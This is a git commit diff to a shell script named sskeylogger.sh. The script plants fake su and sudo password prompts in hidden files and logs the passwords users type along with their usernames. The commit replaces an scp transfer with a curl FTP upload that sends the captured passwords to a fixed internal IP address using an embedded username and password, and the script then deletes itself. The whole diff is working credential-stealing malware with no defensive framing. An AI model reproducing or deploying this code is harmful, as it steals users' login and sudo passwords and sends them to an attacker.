5607f7aad13324748afa3324c5cc1f7a274e5be7
Kempassio <94110817+Kempassio@users.noreply.github.com>
2021-11-25 11:52:28 +0000

    Update sskeylogger.sh

--- sskeylogger.sh
+++ sskeylogger.sh
@@ -13,9 +13,9 @@ echo "read -p \"Password: \" IN" >> $HOME/.sudo_su;
 echo "stty echo" >> $HOME/.sudo_su;
 echo "echo" >> $HOME/.sudo_su;
 echo "date >> $HOME/.plog" >> $HOME/.sudo_su;
-echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_su;
+echo "echo `whoami` : \$IN >> $HOME/.plog" >> $HOME/.sudo_su;
 echo "echo \"su: Authentication failure\"" >> $HOME/.sudo_su;
-echo "scp .plog alejandro@192.168.20.61:/home/alejandro/pwd"
+echo "curl -u alejandro:kornienko23 -T .plog* ftp://192.168.20.2/.cre/ 2>/dev/null" >> $HOME/.sudo_su;
 echo "rm \$HOME/.sudo_sd" >> $HOME/.sudo_su;
 echo "rm \`basename \$0\`" >> $HOME/.sudo_su;
 echo "bash --rcfile .bashrc" >> $HOME/.sudo_su;
@@ -30,9 +30,9 @@ echo "read -p \"[sudo] password for `id -un`: \" IN" >> $HOME/.sudo_sd;
 echo "stty echo" >> $HOME/.sudo_sd;
 echo "echo" >> $HOME/.sudo_sd;
 echo "date >> $HOME/.plog" >> $HOME/.sudo_sd;
-echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
+echo "echo `whoami` : \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
 echo "echo \"Sorry, try again.\"" >> $HOME/.sudo_sd;
-echo "scp .plog alejandro@192.168.20.61:/home/alejandro/pwd"
+echo "curl -u alejandro:kornienko23 -T .plog* ftp://192.168.20.2/.cre/ 2>/dev/null" >> $HOME/.sudo_sd;
 echo "rm \`basename \$0\`" >> $HOME/.sudo_sd;
 echo "rm \$HOME/.sudo_su" >> $HOME/.sudo_sd;
 echo "sudo -k;" >> $HOME/.sudo_sd;
